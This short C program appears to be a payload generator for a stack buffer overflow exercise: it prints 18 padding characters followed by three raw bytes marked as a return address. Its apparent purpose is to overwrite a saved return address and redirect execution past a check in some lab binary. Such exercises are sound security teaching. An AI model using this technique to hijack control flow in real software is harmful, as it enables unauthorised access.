#include <stdlib.h>
#include <stdio.h>


#define ZEROS 18
#define ADDRSIZE 3

int main (void){
	  unsigned char passw[ADDRSIZE] = {0xd8,0x11,0x40};

/////////////////////////////////////////////////////////////////////
	for(int i = 0; i < ZEROS; ++i){
		printf("0");
	}

	//insert return addr
	for(int i = 0; i < ADDRSIZE; ++i){
	printf("%c", passw[i]);
	}
	return 0;
}
